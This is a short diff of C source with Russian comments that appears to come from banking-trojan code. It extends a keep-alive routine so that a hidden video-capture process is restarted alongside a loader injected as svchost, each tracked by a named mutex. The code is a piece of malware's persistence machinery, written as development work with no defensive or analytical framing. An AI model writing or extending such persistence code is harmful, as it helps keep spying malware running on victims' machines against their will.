@@ -11,6 +11,7 @@
 //----------------------------------------------------------------------------
 
 const static char Mutex_SVChost[] = {'k', 'p', '_', 's', 'v', 'c', '_', 'm', 't',  0};
+const static char* Mutex_VideoProcess = "kp_videoprocess";
 
 //-----------------------------------------------------------------------------
 
@@ -19,6 +20,7 @@ PCHAR GetKeepAliveMutexName(DWORD Process)
 	// Функция возвращает имя мютекса для необходимого процесса
 	switch (Process) {
     	case PROCESS_SVCHOST: return (PCHAR)Mutex_SVChost;
+		case PROCESS_VIDEO: return (PCHAR)Mutex_VideoProcess;
 	}
 	return NULL;
 }
@@ -29,6 +31,7 @@ void KeepAliveRestartProcess(DWORD ProcessNomber)
 	// Функция перезапускает указанный процесс
 	switch (ProcessNomber) {
 		case PROCESS_SVCHOST: RunLoaderRoutine(); /*MegaJump(LoaderRoutine);*/ break; // Перезапускаем свхост
+		case PROCESS_VIDEO: RunVideoProcess(); break;
 	}
 }
 //-----------------------------------------------------------------------------
